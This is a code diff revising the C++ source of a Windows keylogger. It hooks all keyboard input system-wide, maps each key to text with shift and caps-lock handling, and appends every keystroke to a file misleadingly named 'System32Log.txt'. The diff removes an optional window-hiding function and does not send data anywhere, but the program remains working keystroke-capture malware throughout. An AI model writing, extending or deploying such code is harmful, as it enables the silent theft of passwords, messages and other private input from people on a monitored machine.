@@ -1,11 +1,17 @@
 #include <Windows.h>
 #include <time.h>
+#include <string>
+#include <fstream>
 #include <iostream>
 #include <cstdio>
+using namespace std;
 
-// defines whether the window is visible or not
-// should be solved with makefile, not in this file
-#define visible // (visible / invisible)
+// TODO
+// Output file for raw vkCodes
+// Output file for printable only?
+// output shift key up, caps lock on/off
+// ReleaseHook() ever called?
+// Both shift keys down, releasing one should not change the unshifted
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
@@ -15,23 +21,76 @@ HHOOK _hook;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
-int Save(int key_stroke, char *file);
-
+// Have to track the shift key status because APIs don't supply consistent result
+bool capslock;
+bool unshifted = 1;
+bool uncontrolled = 1;
+int Save(string key_string, char *file);
+int translate(int vk, string & key_string);
 extern char lastwindow[256];
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-	if (nCode >= 0) {
-		// the action is valid: HC_ACTION.
+	string key_string;
+	if (nCode >= 0) { // the action is valid: HC_ACTION.
 		if (wParam == WM_KEYDOWN) {
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			errno = translate(kbdStruct.vkCode, key_string);
 			// save to file
-			Save(kbdStruct.vkCode, (char *) "System32Log.txt");
+			Save(key_string, (char *) "System32Log.txt");
+			cout << kbdStruct.vkCode << '=' << key_string << '\n';
+		}
+		else if (wParam == WM_KEYUP) {
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			switch (kbdStruct.vkCode) {
+				case VK_SHIFT:
+					key_string = "[SHIFT_UP]";
+					unshifted = 1 ^ capslock;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+				case VK_RSHIFT:
+					key_string = "[RSHIFT_UP]";
+					unshifted = 1 ^ capslock;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+				case VK_LSHIFT:
+					key_string = "[LSHIFT_UP]";
+					unshifted = 1 ^ capslock;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+				case VK_CONTROL:
+					key_string = "[VK_CONTROL_UP]";
+					uncontrolled = 1;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+				case VK_LCONTROL:
+					key_string = "[VK_LCONTROL_UP]";
+					uncontrolled = 1;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+				case VK_RCONTROL:
+					key_string = "[VK_RCONTROL_UP]";
+					uncontrolled = 1;
+					Save(key_string, (char *) "System32Log.txt");
+					cout << kbdStruct.vkCode << '=' << key_string << '\n';
+					break;
+			}
+			//return 0;
+		}
+		else if (wParam == WM_SYSKEYDOWN) {
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			errno = translate(kbdStruct.vkCode, key_string);
+			Save("[ALT]"+key_string, (char *) "System32Log.txt");
+			cout << kbdStruct.vkCode << '=' << "[ALT]" << key_string << '\n';
 		}
 	}
-	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
@@ -49,26 +108,158 @@ void ReleaseHook() {
 	UnhookWindowsHookEx(_hook);
 }
 
-bool lowercase() {
-	bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check caps lock
-																// check shift key
-	if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
-		lowercase = !lowercase;
-	}
-	return lowercase;
-}
-
-int Save(int key_stroke, char *file) {
-	char lastwindow[256];
-	int errno;
+int translate(int vk, string & key_string) {
+	// written for US standard keyboard
 
 	// ignore mouse clicks
-	if ((key_stroke == 1) || (key_stroke == 2) ||  // VK_LBUTTON and VK_RBUTTON
-		(key_stroke == 4) || (key_stroke == 5) || (key_stroke == 6))    // VK_MBUTTON, VK_XBUTTON1, and VK_XBUTTON2
+	if ((vk == VK_LBUTTON) || (vk == VK_RBUTTON)  || 
+		(vk == VK_MBUTTON) || (vk == VK_XBUTTON1) || (vk == VK_XBUTTON2))
 		return 0;
 
-	FILE *OUTPUT_FILE;
-	errno = fopen_s(&OUTPUT_FILE, file, "a+");
+	switch (vk) {
+	case VK_CANCEL: key_string = "[CTRLBREAK]"; break;
+	case VK_BACK: key_string = "[BACKSPACE]"; break;
+	case VK_TAB: key_string = "[TAB]"; break;
+	case VK_CLEAR: key_string = "[CLEAR]"; break;
+	case VK_RETURN: key_string = "[RETURN]\n"; break;
+	case VK_SHIFT: key_string = "[SHIFT_DN]"; unshifted = 0 ^ capslock; break;
+	case VK_CONTROL: key_string = "[CONTROL_DN]"; uncontrolled = 0; break;
+	case VK_MENU: key_string = "[ALT]"; break;
+	case VK_PAUSE: key_string = "[PAUSE]"; break;
+	case VK_CAPITAL: key_string = "[CAPSLOCK]"; capslock ^= 1; unshifted ^= 1; break;
+	case VK_ESCAPE: key_string = "[ESCAPE]"; break;
+	// IME 
+	case VK_SPACE: key_string = " "; break;
+	case VK_PRIOR: key_string = "[PAGEUP]"; break;
+	case VK_NEXT: key_string = "[PAGEDOWN]"; break;
+	case VK_END: key_string = "[END]"; break;
+	case VK_HOME: key_string = "[HOME]"; break;
+	case VK_LEFT: key_string = "[LARROW]"; break;
+	case VK_UP: key_string = "[UPARROW]"; break;
+	case VK_RIGHT: key_string = "[RARROW]"; break;
+	case VK_DOWN: key_string = "[DOWNARROW]"; break;
+	case VK_SELECT: key_string = "[SELECT]"; break;
+	case VK_PRINT: key_string = "[PRINT]"; break;
+	case VK_EXECUTE: key_string = "[EXECUTE]"; break;
+	case VK_SNAPSHOT: key_string = "[PRINTSCREEN]"; break;
+	case VK_INSERT: key_string = "[INSERT]"; break;
+	case VK_DELETE: key_string = "[DELETE]"; break;
+	case VK_HELP: key_string = "[HELP]"; break;
+	// num and alpha values set later
+	case VK_LWIN: key_string = "[LWIN]"; break;
+	case VK_RWIN: key_string = "[RWIN]"; break;
+	case VK_APPS: key_string = "[APPS]"; break;
+	case VK_SLEEP: key_string = "[SLEEP]"; break;
+	//numpad numbers set later
+	case VK_MULTIPLY: key_string = "[NUM_MULTIPLY]"; break;
+	case VK_ADD: key_string = "[NUM_ADD]"; break;
+	case VK_SEPARATOR: key_string = "[NUM?SEPARATOR"; break;
+	case VK_SUBTRACT: key_string = "-"; break; //NUM_PAD '-'
+	case VK_DECIMAL: key_string = "."; break; //NUM_PAD '.'
+	case VK_DIVIDE: key_string = "[NUM_DIVIDE]"; break;
+	case VK_F1: key_string = "[F1]"; break;
+	case VK_F2: key_string = "[F2]"; break;
+	case VK_F3: key_string = "[F3]"; break;
+	case VK_F4: key_string = "[F4]"; break;
+	case VK_F5: key_string = "[F5]"; break;
+	case VK_F6: key_string = "[F6]"; break;
+	case VK_F7: key_string = "[F7]"; break;
+	case VK_F8: key_string = "[F8]"; break;
+	case VK_F9: key_string = "[F9]"; break;
+	case VK_F10: key_string = "[F10]"; break;
+	case VK_F11: key_string = "[F11]"; break;
+	case VK_F12: key_string = "[F12]"; break;
+	case VK_F13: key_string = "[F13]"; break;
+	case VK_F14: key_string = "[F14]"; break;
+	case VK_F15: key_string = "[F15]"; break;
+	case VK_F16: key_string = "[F16]"; break;
+	case VK_F17: key_string = "[F17]"; break;
+	case VK_F18: key_string = "[F18]"; break;
+	case VK_F19: key_string = "[F19]"; break;
+	case VK_F20: key_string = "[F20]"; break;
+	case VK_F21: key_string = "[F21]"; break;
+	case VK_F22: key_string = "[F22]"; break;
+	case VK_F23: key_string = "[F23]"; break;
+	case VK_F24: key_string = "[F24]"; break;
+	// unassigned
+	case VK_NUMLOCK: key_string = "[NUMLOCK]"; break;
+	case VK_SCROLL: key_string = "[SCROLLLOCK]"; break;
+	// OEM & unassigned
+	case VK_LSHIFT: key_string = "[LSHIFT_DN]"; unshifted = 0 ^ capslock; break;
+	case VK_RSHIFT: key_string = "[RSHIFT_DN]"; unshifted = 0 ^ capslock; break;
+	case VK_LCONTROL: key_string = "[LCONTROL_DN]"; uncontrolled = 0; break;
+	case VK_RCONTROL: key_string = "[RCONTROL_DN]"; uncontrolled = 0; break;
+	case VK_LMENU: key_string = "[LALT]"; break;
+	case VK_RMENU: key_string = "[RALT]"; break;
+	case VK_BROWSER_BACK: key_string = "[BROWSER_BACK]"; break;
+	case VK_BROWSER_FORWARD: key_string = "[BROWSER_FORWARD]"; break;
+	case VK_BROWSER_REFRESH: key_string = "[BROWSER_REFRESH]"; break;
+	case VK_BROWSER_STOP: key_string = "[BROWSER_STOP]"; break;
+	case VK_BROWSER_SEARCH: key_string = "[BROWSER_SEARCH]"; break;
+	case VK_BROWSER_FAVORITES: key_string = "[BROWSER_FAVORITES]"; break;
+	case VK_BROWSER_HOME: key_string = "[BROWSER_HOME]"; break;
+	case VK_VOLUME_MUTE: key_string = "[VOLUME_MUTE]"; break;
+	case VK_VOLUME_DOWN: key_string = "[VOLUME_DOWN]"; break;
+	case VK_VOLUME_UP: key_string = "[VOLUME_UP]"; break;
+	case VK_MEDIA_NEXT_TRACK: key_string = "[MEDIA_NEXT_TRACK]"; break;
+	case VK_MEDIA_PREV_TRACK: key_string = "[MEDIA_PREV_TRACK]"; break;
+	case VK_MEDIA_STOP: key_string = "[MEDIA_STOP]"; break;
+	case VK_MEDIA_PLAY_PAUSE: key_string = "[MEDIA_PLAY_PAUSE]"; break;
+	case VK_LAUNCH_MAIL: key_string = "[LAUNCH_MAIL]"; break;
+	case VK_LAUNCH_MEDIA_SELECT: key_string = "[LAUNCH_MEDIA_SELECT]"; break;
+	case VK_LAUNCH_APP1: key_string = "[LAUNCH_APP1]"; break;
+	case VK_LAUNCH_APP2: key_string = "[LAUNCH_APP2]"; break;
+	case VK_OEM_1: key_string = unshifted ? ";" : ":"; break;
+	case VK_OEM_PLUS: key_string = unshifted ? "=" : "+"; break; // get VK_OEM_PLUS on the '=' key unshifted o.O
+	case VK_OEM_COMMA: key_string = unshifted ? "," : "<"; break;
+	case VK_OEM_MINUS: key_string = unshifted ? "-" : "_"; break;
+	case VK_OEM_PERIOD: key_string = unshifted ? "." : ">"; break;
+	case VK_OEM_2: key_string = unshifted ? "/" : "?"; break;
+	case VK_OEM_3: key_string = unshifted ? "`" : "~"; break;
+	// reserved & unassigned
+	case VK_OEM_4: key_string = unshifted ? "[" : "{"; break;
+	case VK_OEM_5: key_string = unshifted ? "\\" : "|"; break;
+	case VK_OEM_6: key_string = unshifted ? "]" : "}"; break;
+	case VK_OEM_7: key_string = unshifted ? "'" : "\""; break;
+	default:
+		char temp[2];
+		if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
+			sprintf_s(temp, "%c", (vk - 48)); // set to number
+			key_string = temp;
+		} else if (vk >= 65 && vk <= 90) { // A-Z
+			if (unshifted) sprintf_s(temp, "%c", (vk + 32));
+			else sprintf_s(temp, "%c", vk);
+			key_string = temp;
+		} else if (vk >= 0x30 && vk <= 0x39) { // 0-9
+			if (unshifted) {
+				sprintf_s(temp, "%c", vk);
+				key_string = temp;
+			} else {
+				switch (vk) {
+				case 0x30: key_string = ")"; break;
+				case 0x31: key_string = "!"; break;
+				case 0x32: key_string = "@"; break;
+				case 0x33: key_string = "#"; break;
+				case 0x34: key_string = "$"; break;
+				case 0x35: key_string = "%"; break;
+				case 0x36: key_string = "^"; break;
+				case 0x37: key_string = "&"; break;
+				case 0x38: key_string = "*"; break;
+				case 0x39: key_string = "("; break;
+				}
+			}
+		} else {
+			sprintf_s(temp, "%s%x.2%s", "[Raw KeyCode 0x", vk, "]");
+			key_string = temp;
+		}
+		break;
+	}
+	return 0;
+}
+
+int Save(string key_string, char *file) {
+	ofstream OUTPUT_FILE (file, ios::app);
+	OUTPUT_FILE << key_string;
 
 	//HWND foreground = GetForegroundWindow();
 	//if (foreground)	{
@@ -89,256 +280,17 @@ int Save(int key_stroke, char *file) {
 	//	}
 	//}
 
-	std::cout << key_stroke << '\n';
-	switch (key_stroke) {
-	case VK_CANCEL: fprintf(OUTPUT_FILE, "%s", "[CTRLBREAK]");
-		break;
-	case VK_BACK: fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
-		break;
-	case VK_TAB: fprintf(OUTPUT_FILE, "%s", "[TAB]");
-		break;
-	case VK_CLEAR: fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
-		break;
-	case VK_RETURN: fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
-		break;
-	case VK_SHIFT: fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
-		break;
-	case VK_CONTROL: fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
-		break;
-	case VK_MENU: fprintf(OUTPUT_FILE, "%s", "[ALT]");
-		break;
-	case VK_PAUSE: fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
-		break;
-	case VK_CAPITAL: fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
-		break;
-	case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
-		break;
-	case VK_SPACE: fprintf(OUTPUT_FILE, "%s", " ");
-		break;
-	case VK_PRIOR: fprintf(OUTPUT_FILE, "%s", "[PAGEUP]");
-		break;
-	case VK_NEXT: fprintf(OUTPUT_FILE, "%s", "[PAGEDOWN]");
-		break;
-	case VK_END: fprintf(OUTPUT_FILE, "%s", "[END]");
-		break;
-	case VK_HOME: fprintf(OUTPUT_FILE, "%s", "[HOME]");
-		break;
-	case VK_LEFT: fprintf(OUTPUT_FILE, "%s", "[LARROW]");
-		break;
-	case VK_UP: fprintf(OUTPUT_FILE, "%s", "[UPARROW]");
-		break;
-	case VK_RIGHT: fprintf(OUTPUT_FILE, "%s", "[RARROW]");
-		break;
-	case VK_DOWN: fprintf(OUTPUT_FILE, "%s", "[DOWNARROW]");
-		break;
-	case VK_SELECT: fprintf(OUTPUT_FILE, "%s", "[SELECT]");
-		break;
-	case VK_PRINT: fprintf(OUTPUT_FILE, "%s", "[PRINT]");
-		break;
-	case VK_EXECUTE: fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
-		break;
-	case VK_SNAPSHOT: fprintf(OUTPUT_FILE, "%s", "[PRINTSCREEN]");
-		break;
-	case VK_INSERT: fprintf(OUTPUT_FILE, "%s", "[INSERT]");
-		break;
-	case VK_DELETE: fprintf(OUTPUT_FILE, "%s", "[DELETE]");
-		break;
-	case VK_HELP: fprintf(OUTPUT_FILE, "%s", "[HELP]");
-		break;
-	// num and alpha
-	case VK_LWIN: fprintf(OUTPUT_FILE, "%s", "[LWIN]");
-		break;
-	case VK_RWIN: fprintf(OUTPUT_FILE, "%s", "[RWIN]");
-		break;
-	case VK_APPS: fprintf(OUTPUT_FILE, "%s", "[APPS]");
-		break;
-	case VK_SLEEP: fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
-		break;
-	//numpad
-	case VK_MULTIPLY: fprintf(OUTPUT_FILE, "%s", "[NUM_MULTIPLY]");
-		break;
-	case VK_ADD: fprintf(OUTPUT_FILE, "%s", "[NUM_ADD]");
-		break;
-	case VK_SEPARATOR: fprintf(OUTPUT_FILE, "%s", "[NUM?SEPARATOR");
-		break;
-	case VK_DIVIDE: fprintf(OUTPUT_FILE, "%s", "[NUM_DIVIDE]");
-		break;
-	case VK_F1: fprintf(OUTPUT_FILE, "%s", "[F1]");
-		break;
-	case VK_F2: fprintf(OUTPUT_FILE, "%s", "[F2]");
-		break;
-	case VK_F3: fprintf(OUTPUT_FILE, "%s", "[F3]");
-		break;
-	case VK_F4: fprintf(OUTPUT_FILE, "%s", "[F4]");
-		break;
-	case VK_F5: fprintf(OUTPUT_FILE, "%s", "[F5]");
-		break;
-	case VK_F6: fprintf(OUTPUT_FILE, "%s", "[F6]");
-		break;
-	case VK_F7: fprintf(OUTPUT_FILE, "%s", "[F7]");
-		break;
-	case VK_F8: fprintf(OUTPUT_FILE, "%s", "[F8]");
-		break;
-	case VK_F9: fprintf(OUTPUT_FILE, "%s", "[F9]");
-		break;
-	case VK_F10: fprintf(OUTPUT_FILE, "%s", "[F10]");
-		break;
-	case VK_F11: fprintf(OUTPUT_FILE, "%s", "[F11]");
-		break;
-	case VK_F12: fprintf(OUTPUT_FILE, "%s", "[F12]");
-		break;
-	case VK_F13: fprintf(OUTPUT_FILE, "%s", "[F13]");
-		break;
-	case VK_F14: fprintf(OUTPUT_FILE, "%s", "[F14]");
-		break;
-	case VK_F15: fprintf(OUTPUT_FILE, "%s", "[F15]");
-		break:
-	case VK_F16: fprintf(OUTPUT_FILE, "%s", "[F16]");
-		break;
-	case VK_F17: fprintf(OUTPUT_FILE, "%s", "[F17]");
-		break;
-	case VK_F18: fprintf(OUTPUT_FILE, "%s", "[F18]");
-		break;
-	case VK_F19: fprintf(OUTPUT_FILE, "%s", "[F19]");
-		break;
-	case VK_F20: fprintf(OUTPUT_FILE, "%s", "[F20]");
-		break;
-	case VK_F21: fprintf(OUTPUT_FILE, "%s", "[F21]");
-		break;
-	case VK_F22: fprintf(OUTPUT_FILE, "%s", "[F22]");
-		break;
-	case VK_F23: fprintf(OUTPUT_FILE, "%s", "[F23]");
-		break;
-	case VK_F24: fprintf(OUTPUT_FILE, "%s", "[F24]");
-		break;
-	//
-	case VK_NUMLOCK: fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]");
-		break;
-	case VK_SCROLL: fprintf(OUTPUT_FILE, "%s", "[SCROLLLOCK]");
-		break;
-	//
-	case VK_LSHIFT: fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
-		break;
-	case VK_RSHIFT: fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
-		break;
-	case VK_LCONTROL: fprintf(OUTPUT_FILE, "%s", "[LCONTROL]");
-		break;
-	case VK_RCONTROL: fprintf(OUTPUT_FILE, "%s", "[RCONTROL]");
-		break;
-	//case VK_LMENU: fprintf(OUTPUT_FILE, "%s", "[LMENU]");
-	//	break;
-	//case VK_RMENU: fprintf(OUTPUT_FILE, "%s", "[RMENU]");
-	//	break;
-	//case VK_BROWSER_BACK: fprintf(OUTPUT_FILE, "%s", "[BROWSER_BACK]");
-	//	break;
-	//case VK_BROWSER_FORWARD: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FORWARD]");
-	//	break;
-	//case VK_BROWSER_REFRESH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_REFRESH]");
-	//	break;
-	//case VK_BROWSER_STOP: fprintf(OUTPUT_FILE, "%s", "[BROWSER_STOP]");
-	//	break;
-	//case VK_BROWSER_SEARCH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_SEARCH]");
-	//	break;
-	//case VK_BROWSER_FAVORITES: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FAVORITES]");
-	//	break;
-	//case VK_BROWSER_HOME: fprintf(OUTPUT_FILE, "%s", "[BROWSER_HOME]");
-	//	break;
-	//case VK_VOLUME_MUTE: fprintf(OUTPUT_FILE, "%s", "[VOLUME_MUTE]");
-	//	break;
-	//case VK_VOLUME_DOWN: fprintf(OUTPUT_FILE, "%s", "[VOLUME_DOWN]");
-	//	break;
-	//case VK_VOLUME_UP: fprintf(OUTPUT_FILE, "%s", "[VOLUME_UP]");
-	//	break;
-	//case VK_MEDIA_NEXT_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_NEXT_TRACK]");
-	//	break;
-	//case VK_MEDIA_PREV_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PREV_TRACK]");
-	//	break;
-	//case VK_MEDIA_STOP: fprintf(OUTPUT_FILE, "%s", "[MEDIA_STOP]");
-	//	break;
-	//case VK_MEDIA_PLAY_PAUSE: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PLAY_PAUSE]");
-	//	break;
-	//case VK_LAUNCH_MAIL: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MAIL]");
-	//	break;
-	//case VK_LAUNCH_MEDIA_SELECT: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MEDIA_SELECT]");
-	//	break;
-	//case VK_LAUNCH_APP1: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP1]");
-	//	break;
-	//case VK_LAUNCH_APP2: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP2]");
-	//	break;
-	case VK_OEM_PLUS: fprintf(OUTPUT_FILE, "%s", "+");
-		break;
-	case VK_OEM_COMMA: fprintf(OUTPUT_FILE, "%s", ",");
-		break;
-	case VK_OEM_MINUS:
-	case VK_SUBTRACT: fprintf(OUTPUT_FILE, "%s", "-");
-		break;
-	case VK_OEM_PERIOD:
-	case VK_DECIMAL: fprintf(OUTPUT_FILE, "%s", ".");
-		break;
-	case VK_OEM_1:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", ";"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", ":");
-		break;
-	case VK_OEM_2:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "/"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "?");
-		break;
-	case VK_OEM_3:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "`"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "~");
-		break;
-	case VK_OEM_4:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "["); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "{");
-		break;
-	case VK_OEM_5:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "\\"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "|");
-		break;
-	case VK_OEM_6:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "]"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "}");
-		break;
-	case VK_OEM_7:
-		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "'"); // US standard keyboard
-		else fprintf(OUTPUT_FILE, "%s", "\"");
-		break;
-	default:
-		if (key_stroke >= 96 && key_stroke <= 105) { // numpad numbers
-			key_stroke -= 48;
-		}
-		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
-			if (lowercase()) key_stroke += 32;
-		}
-		fprintf(OUTPUT_FILE, "%c", key_stroke);
-		break;
-	}
-	// NOTE: Numpad-Keys seem to print as lowercase letters
-
-	fclose(OUTPUT_FILE);
+	OUTPUT_FILE.close();
 	return 0;
 }
 
-void Stealth() {
-#ifdef visible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-#endif // visible
-
-#ifdef invisible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-#endif // invisible
-}
-
 int main() {
-	// visibility of window
-	Stealth();
-
-	// Set the hook
 	SetHook();
+	
+	capslock = ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) ? 0 : 1;
+	unshifted ^= capslock;
 
-	// loop to keep the console application running.
 	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-	{
-	}
+	while (GetMessage(&msg, NULL, 0, 0)) // loop to keep the console application running.
+	{}
 }
